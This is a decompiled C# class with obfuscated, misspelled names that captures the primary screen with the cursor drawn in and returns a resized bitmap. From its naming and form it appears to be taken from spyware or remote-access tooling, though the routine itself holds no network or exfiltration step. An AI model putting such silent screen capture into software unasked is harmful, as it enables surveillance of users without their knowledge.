using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace hdrmiprcav;

internal class SCILRNS
{
	private struct CURSORINFO
	{
		public int cb_size;

		public int flags;

		public IntPtr h_cursor;

		public POINTAPI prt_scren_pos;
	}

	private struct POINTAPI
	{
		public int x;

		public int y;
	}

	private const int cursor_showing = 1;

	[DllImport("user32.dll")]
	private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

	public Bitmap desk_scren(int mg_height)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0124: Unknown result type (might be due to invalid IL or missing references)
		//IL_012b: Expected O, but got Unknown
		Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)137224);
		try
		{
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			try
			{
				val2.CopyFromScreen(0, 0, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
				CURSORINFO pci = default(CURSORINFO);
				pci.cb_size = Marshal.SizeOf(typeof(CURSORINFO));
				if (GetCursorInfo(out pci) && pci.flags == 1)
				{
					DrawIcon(val2.GetHdc(), pci.prt_scren_pos.x, pci.prt_scren_pos.y, pci.h_cursor);
					val2.ReleaseHdc();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		catch
		{
			return null;
		}
		int height = ((Image)val).get_Height() * (mg_height * 100 / ((Image)val).get_Height()) / 100;
		int width = mg_height + mg_height * 100 / ((Image)val).get_Width() * mg_height / 100 + 100;
		return new Bitmap((Image)(object)val, new Size(width, height));
	}

	[DllImport("user32.dll")]
	private static extern bool GetCursorInfo(out CURSORINFO pci);
}
